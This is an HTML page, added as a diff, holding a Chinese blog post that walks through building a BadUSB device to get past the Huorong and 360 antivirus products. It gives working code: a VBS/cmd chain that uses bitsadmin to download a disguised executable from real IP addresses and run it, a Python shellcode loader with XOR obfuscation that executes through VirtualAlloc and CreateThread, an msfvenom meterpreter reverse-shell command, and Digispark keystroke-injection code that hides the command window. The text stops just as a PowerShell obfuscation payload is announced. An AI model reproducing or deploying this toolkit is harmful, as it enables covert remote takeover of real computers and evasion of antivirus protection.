@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言最近偶然了解到”BadUSB”，感觉很好玩，试着制作了一个，过程很曲折坎坷。我也尝试去绕过了一些AntiVirus的检测，结果也是比较让自己满意的。接下来的文章我将按照我的思路进行，写一下BadUSB的制作过程，以及遇到的困难和解决办法。（小白文，可能有些基础的东西解释的有点多） BadUSB原理浅析在2014年的BlackHat大会上，信息安全专家展示了一种新的网络安全威胁，这种技术被称为B">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初探BadUSB">
+<meta property="og:url" content="https://r4inb00w.github.io/2022/12/01/badusb/index.html">
+<meta property="og:site_name" content="rainb0w">
+<meta property="og:description" content="前言最近偶然了解到”BadUSB”，感觉很好玩，试着制作了一个，过程很曲折坎坷。我也尝试去绕过了一些AntiVirus的检测，结果也是比较让自己满意的。接下来的文章我将按照我的思路进行，写一下BadUSB的制作过程，以及遇到的困难和解决办法。（小白文，可能有些基础的东西解释的有点多） BadUSB原理浅析在2014年的BlackHat大会上，信息安全专家展示了一种新的网络安全威胁，这种技术被称为B">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic.imgdb.cn/item/63886eb116f2c2beb11a1423.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/63886f5c16f2c2beb11c2648.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/63887a0f16f2c2beb12ae74d.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/63887a0316f2c2beb12ad9ea.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/63887d9516f2c2beb132d8e4.jpg">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6388ce5016f2c2beb1d0a9e7.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6388ce5e16f2c2beb1d0b8ac.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6388ce6816f2c2beb1d0c3de.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/6388ce7616f2c2beb1d0d2b7.png">
+<meta property="article:published_time" content="2022-12-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-10T02:35:31.629Z">
+<meta property="article:author" content="rainb0w">
+<meta property="article:tag" content="security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/63886eb116f2c2beb11a1423.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>初探BadUSB</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/01/29/htb-awkawrd/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/11/08/vulnstack5/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://r4inb00w.github.io/2022/12/01/badusb/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://r4inb00w.github.io/2022/12/01/badusb/&text=初探BadUSB"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://r4inb00w.github.io/2022/12/01/badusb/&title=初探BadUSB"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r4inb00w.github.io/2022/12/01/badusb/&is_video=false&description=初探BadUSB"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=初探BadUSB&body=Check out this article: https://r4inb00w.github.io/2022/12/01/badusb/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://r4inb00w.github.io/2022/12/01/badusb/&title=初探BadUSB"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://r4inb00w.github.io/2022/12/01/badusb/&title=初探BadUSB"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://r4inb00w.github.io/2022/12/01/badusb/&title=初探BadUSB"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://r4inb00w.github.io/2022/12/01/badusb/&title=初探BadUSB"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://r4inb00w.github.io/2022/12/01/badusb/&name=初探BadUSB&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://r4inb00w.github.io/2022/12/01/badusb/&t=初探BadUSB"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BadUSB%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">BadUSB原理浅析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HID%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">HID攻击原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BadUSB%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3"><span class="toc-number">2.2.</span> <span class="toc-text">BadUSB个人理解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%87%86%E5%A4%87"><span class="toc-number">3.</span> <span class="toc-text">工具准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-%E7%81%AB%E7%BB%92"><span class="toc-number">4.</span> <span class="toc-text">Bypass 火绒</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#vbs%E7%BC%96%E5%86%99"><span class="toc-number">4.1.</span> <span class="toc-text">vbs编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC%E7%BC%96%E5%86%99"><span class="toc-number">4.2.</span> <span class="toc-text">免杀木马编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99Arduino%E4%BB%A3%E7%A0%81"><span class="toc-number">4.3.</span> <span class="toc-text">编写Arduino代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-360"><span class="toc-number">5.</span> <span class="toc-text">Bypass 360</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell%E5%85%8D%E6%9D%80"><span class="toc-number">5.1.</span> <span class="toc-text">powershell免杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99bat"><span class="toc-number">5.2.</span> <span class="toc-text">编写bat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99Arduino"><span class="toc-number">5.3.</span> <span class="toc-text">编写Arduino</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">6.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        初探BadUSB
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">rainb0w</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-12-01T00:00:00.000Z" class="dt-published" itemprop="datePublished">2022-12-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/security/" rel="tag">security</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近偶然了解到”BadUSB”，感觉很好玩，试着制作了一个，过程很曲折坎坷。我也尝试去绕过了一些AntiVirus的检测，结果也是比较让自己满意的。接下来的文章我将按照我的思路进行，写一下BadUSB的制作过程，以及遇到的困难和解决办法。（小白文，可能有些基础的东西解释的有点多）</p>
+<h2 id="BadUSB原理浅析"><a href="#BadUSB原理浅析" class="headerlink" title="BadUSB原理浅析"></a>BadUSB原理浅析</h2><p>在2014年的BlackHat大会上，信息安全专家展示了一种新的网络安全威胁，这种技术被称为BadUSB，该漏洞由Karsten Nohl和Jakob Lell共同发现。在分析BadUSB的原理前，我认为应该先了解一下HID攻击原理。</p>
+<h3 id="HID攻击原理"><a href="#HID攻击原理" class="headerlink" title="HID攻击原理"></a>HID攻击原理</h3><p>HID是Human Interface Device的缩写，由其名称可以了解HID设备是直接与人交互的设备，例如键盘、鼠标与游戏杆等。不过HID设备并不一定要有人机接口，只要符合HID类别规范的设备都是HID设备。一般来讲针对HID的攻击主要集中在键盘鼠标上，因为只要控制了用户键盘，基本上就等于控制了用户的电脑。攻击者会把攻击隐藏在一个正常的鼠标键盘中，当用户将含有攻击向量的鼠标或键盘，插入电脑时，恶意代码会被加载并执行。</p>
+<p>在BadUSB出现之前，利用HID进行攻击的方式一般有两种：USB RUBBER DUCKY和TEENSY。这两种攻击方式，是在BadUSB公布之前，比较流行的两种HID攻击方式。缺陷在于要定制硬件设备，通用性较差。但是BadUSB就不一样了，它是在“USB RUBBER DUCKY”和“Teensy”攻击方式的基础上用通用的USB设备（比如U盘）。</p>
+<h3 id="BadUSB个人理解"><a href="#BadUSB个人理解" class="headerlink" title="BadUSB个人理解"></a>BadUSB个人理解</h3><p>通俗一点来解释BadUSB的攻击方式：当BadUSB插入PC后，会模拟出一个虚拟键盘，同时执行我们事先写入到固件中的代码来敲击相应的按键，输入攻击代码从而完成一些恶意行为，如远程下载木马并执行或者强制关机等等（强制关机可能有点捉弄人……）。</p>
+<p>U盘的内部构造：</p>
+<p><img src="https://pic.imgdb.cn/item/63886eb116f2c2beb11a1423.png"></p>
+<p>可以看到，U盘大致由两部分组成，一部分是芯片引导程序，一部分是闪存区域。</p>
+<p>芯片控制器负责与PC的通讯和识别，闪存用来做数据存储；闪存中有一部分区域用来存放U盘的固件，它的作用类似于操作系统，控制软硬件交互；固件无法通过普通手段进行读取。我们的恶意代码正是写入在固件中，而这部分区域是杀毒软件无法访问的区域，因此大部分杀毒软件是根本无法应对BadUSB攻击的。</p>
+<p>我们可以想象这样一个场景，黑客在咖啡厅、机场或者公园的长椅故意放置这种写入了恶意程序的USB硬件，有些人可能会因为好奇捡走这些设备，并迫不及die地插入电脑中想要看看里面有什么宝藏，而这正陷入了黑客设计的陷阱中。这种攻击行为也经常被利用在一些护网行动中，有些红队成员会故意在现场落下一个U盘，被蓝队成员捡走后插入电脑中，成功获得蓝队成员电脑的控制权。</p>
+<h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><p>1、一台有公网IP的服务器</p>
+<p>2、一块淘宝上14块钱购买的Digispark开发板：</p>
+<p><img src="https://pic.imgdb.cn/item/63886f5c16f2c2beb11c2648.png"></p>
+<p>3、软件驱动：</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/digistump/DigistumpArduino/releases">https://github.com/digistump/DigistumpArduino/releases</a></p>
+<p>4、Arduino IDE(Arduino IDE的安装和配置教程网上很多，这里不再赘述)</p>
+<p>5、CobaltStrike</p>
+<p>6、Metasploit</p>
+<h2 id="Bypass-火绒"><a href="#Bypass-火绒" class="headerlink" title="Bypass 火绒"></a>Bypass 火绒</h2><h3 id="vbs编写"><a href="#vbs编写" class="headerlink" title="vbs编写"></a>vbs编写</h3><p>关于绕过火绒，我的思路是这样的：首先利用Metasploit生成shellcode，然后编写免杀代码进行免杀生成exe马，接着利用windows的makecab命令来压缩这个exe马为zip，接着把生成的zip放在公网服务器上。插入BadUSB后，程序模拟键盘输入如下内容至microsoft.vbs文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set ws=WScript.CreateObject(&quot;WScript.Shell&quot;) </span><br><span class="line"></span><br><span class="line">ws.Run&quot;cmd.exe /c mkdir c:\temp1 &amp;&amp; bitsadmin  /transfer n http://124.221.248.16:888/QQ_cache.zip c:\temp1\QQ_cache.zip &amp;&amp; expand c:\temp1\QQ_cache.zip c:\temp1\QQ_cache.exe &amp;&amp; del c:\temp1\QQ_cache.zip &amp;&amp; c:\temp1\QQ_cache.exe&quot;,0</span><br></pre></td></tr></table></figure>
+
+<p>接着执行这个vbs文件。那么这段代码的含义是什么呢？</p>
+<p>首先创建一个C:\temp1文件夹，接着在公网服务器上下载生成的zip文件至这个文件夹，利用expand解压zip文件得到exe马，然后删除zip文件并执行exe马。</p>
+<p>这里有几个问题。首先我为什么会使用bitsadmin来下载文件而非certutil或powershell呢？</p>
+<p>原因是bitsadmin下载方式相对于certutil和powershell下载方式来说免杀效果似乎更好。在我的电脑上（已安装火绒杀毒软件）测试，使用certutil下载文件，火绒虽未报警，却会在安全日志中存在记录，而如果利用powershell下载的话则会直接报警：</p>
+<p><img src="https://pic.imgdb.cn/item/63887a0f16f2c2beb12ae74d.png"></p>
+<p><img src="https://pic.imgdb.cn/item/63887a0316f2c2beb12ad9ea.png"></p>
+<p>那么为什么要多此一举的在公网服务器上放置的木马文件是zip文件而不直接是exe马呢？因为直接下载exe的话不论什么下载命令杀毒软件都会直接报警，而如果下载的是zip文件，火绒是不会报警的。并且我们可以直接利用windows自带的解压命令expand来解压该zip文件。</p>
+<p>最后一个也是最重要的问题是解压下来的木马文件，也就是木马.exe文件如何做免杀从而绕过火绒或者说大部分杀软呢？</p>
+<h3 id="免杀木马编写"><a href="#免杀木马编写" class="headerlink" title="免杀木马编写"></a>免杀木马编写</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">shell_code,keys</span>):</span><br><span class="line">    shell_code_base64 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    random.seed(keys)</span><br><span class="line">    code = shell_code.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> code:</span><br><span class="line">        item = <span class="built_in">int</span>(item)</span><br><span class="line">        shell_code_base64 += <span class="built_in">chr</span>(item ^ random.randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> shell_code_base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fs_decode</span>(<span class="params">funcs</span>):</span><br><span class="line">    fs_keys = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">    func_codes = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    random.seed(fs_keys)</span><br><span class="line">    func_code = funcs.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> func_code:</span><br><span class="line">        item = <span class="built_in">int</span>(item)</span><br><span class="line">        func_codes += <span class="built_in">chr</span>(item ^ random.randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">    <span class="keyword">return</span> func_codes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">ShellCode,keys</span>):</span><br><span class="line">    random.seed(keys)</span><br><span class="line">    ShellCode_2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> ShellCode:</span><br><span class="line">        ShellCode_2 += <span class="built_in">str</span>(<span class="built_in">ord</span>(item) ^ random.randint(<span class="number">0</span>, <span class="number">255</span>)) + <span class="string">&#x27;,&#x27;</span></span><br><span class="line">    ShellCode_2 = ShellCode_2.strip(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> ShellCode_2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">shellcode</span>):</span><br><span class="line">    ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64</span><br><span class="line">    rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line">    funcs = <span class="string">&#x27;70,208,133,111,226,123,113,146,231,30,133,20,54,203,71,77,230,234,182,55,207,108,203,231,232,79,137,160,182,180,203,54,84,167,78,235,21,203,131,209,183,25,202,144,179,84,168,137,158,181,33,136,154,102,166,98,8,179,139,242,251,26,1,178,19,125,22,209,56,51,119,41,229,118,164,182,74,178,157,53,248,183,48,58,66,179,109,168,30,182,106,60,119,170,147,57,73,4,41,221,62,148,2,9,60,188,167,47,194,232,35,141,240,193,78,169,122,86&#x27;</span></span><br><span class="line">    func = fs_decode(funcs)</span><br><span class="line">    <span class="built_in">exec</span>(func)</span><br><span class="line">    handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, ctypes.c_uint64(rwxpage), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ShellCode = <span class="string">&#x27;&#x27;&#x27; ShellCode &#x27;&#x27;&#x27;</span></span><br><span class="line">    keys = <span class="string">&#x27;Axx8&#x27;</span></span><br><span class="line">    shell_code = encode(ShellCode.replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>),keys)</span><br><span class="line">    shellcode = decode(shell_code,keys)</span><br><span class="line">    shellcode = base64.b64decode(shellcode)</span><br><span class="line">    run(shellcode)</span><br></pre></td></tr></table></figure>
+
+<p><strong>生成ShellCode</strong></p>
+<p><code>msfvenom -p windows/x64/meterpreter/reverse\_tcp lhost=vps\_ip lport=vps\_port --encrypt base64 -f c</code></p>
+<p>生成的shellcode直接替换给出的代码中的ShellCode即可。</p>
+<p>接着我们利用pyinstaller生成一个exe文件：</p>
+<p><code>pyinstaller -F -i qq.ico QQ\_cache.py</code></p>
+<p><img src="https://pic.imgdb.cn/item/63887d9516f2c2beb132d8e4.jpg"></p>
+<p>这个木马亲测可绕过360和火绒。因为在我的公网服务器上并没有metasploit，因此上述生成shellcode的操作我是在自己的kali上实现的。因为不太想在公网服务器上下载一个metasploit，因此我利用frp实现了个内网穿透，在自己kali的metasploit上监听1234端口，frp配置如下：</p>
+<p>frps.ini：</p>
+<p><img src="https://pic.imgdb.cn/item/6388ce5016f2c2beb1d0a9e7.png"></p>
+<p>frpc.ini：</p>
+<p><img src="https://pic.imgdb.cn/item/6388ce5e16f2c2beb1d0b8ac.png"></p>
+<h3 id="编写Arduino代码"><a href="#编写Arduino代码" class="headerlink" title="编写Arduino代码"></a>编写Arduino代码</h3><p>接着就是完成Arduino代码了，这里直接给出代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line">String a;</span><br><span class="line">String b;</span><br><span class="line">String c;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>);<span class="comment">//开启CapsLock大写锁定键</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);<span class="comment">//按下Win+R键</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">800</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;MODE CON: cols=16 lines=1 &amp;&amp; color fe&quot;</span>);<span class="comment">//尽可能隐藏cmd窗口</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">100</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO SET WS=wsCRIPT.cREATEoBJECT(\&quot;wsCRIPT.sHELL\&quot;) &gt; MICROSOFT.VBS&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO WS.rUN\&quot;CMD.EXE /C MKDIR C:\\TEMP1 &amp;&amp; BITSADMIN  /TRANSFER N HTTP://43.139.114.127:888/qq_CACHE.ZIP C:\\TEMP1\\qq_CACHE.ZIP &amp;&amp; EXPAND C:\\TEMP1\\qq_CACHE.ZIP C:\\TEMP1\\qq_CACHE.EXE &amp;&amp; DEL C:\\TEMP1\\qq_CACHE.ZIP &amp;&amp; C:\\TEMP1\\qq_CACHE.EXE\&quot;,0 &gt;&gt;MICROSOFT.VBS&quot;</span>);<span class="comment">//将命令代码写入vbs文件</span></span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;MICROSOFT.VBS&quot;</span>);<span class="comment">//执行vbs文件</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;exit&quot;</span>);<span class="comment">//退出cmd</span></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>);<span class="comment">//关闭CapsLock大写锁定键</span></span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为之前从未接触过Arduino，因此我在制作时，绝大部分的时间浪费在了编写Arduino代码的部分。这里提一下我遇到的问题吧。</p>
+<p>首先是中文输入法所导致的命令输入不成功。解决办法很简单，就是按下CapsLock，因为Windows大小写不敏感。CapsLock键在DigiKeyboard.h库中是57。</p>
+<p>接着呢就是DigiKeyboard的一些方法的调用了。其实网上搜索一波<code>DigiKeyboard.h</code>就可以找到源代码：<a target="_blank" rel="noopener" href="https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h">https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h</a>。审计一下源代码就知道了。</p>
+<p>用秒表测了一下，插入USB 14秒左右全部命令即可被执行完成，执行完命令后就可以拔出USB了。</p>
+<p>接下来请看效果：</p>
+<p><a target="_blank" rel="noopener" href="https://watch.wave.video/4Ao60qmNYCgQx2ZI">https://watch.wave.video/4Ao60qmNYCgQx2ZI</a></p>
+<h2 id="Bypass-360"><a href="#Bypass-360" class="headerlink" title="Bypass 360"></a>Bypass 360</h2><p>接着就是艰难的绕过360了。当我满心欢喜地拿着可以绕过火绒的BadUSB来插入装有360的虚拟机的时候，我发现在执行vbs文件的那一步命令的时候360就给我拦住了。寄！</p>
+<p><img src="https://pic.imgdb.cn/item/6388ce6816f2c2beb1d0c3de.png"></p>
+<p>并且360会对bitsadmin命令提出警告，也会对expand解压下载下来的zip文件的操作进行警告。因此360似乎有点难绕（尽管我们上面生成的exe马360也检测不到，但是把它传入到用户的PC上似乎并不是一件易事）。那我们就得换一个思路了，我这里想到的思路是通过powershell执行CobaltStrike的命令来拿到shell。</p>
+<h3 id="powershell免杀"><a href="#powershell免杀" class="headerlink" title="powershell免杀"></a>powershell免杀</h3><p>我们都知道，各个杀毒软件对于powershell执行命令都做了严格的过滤和限制，因此直接执行powershell命令肯定会被360检测到并弹出警告。这就需要我们进行powershell混淆了。这里直接给出payload：</p>
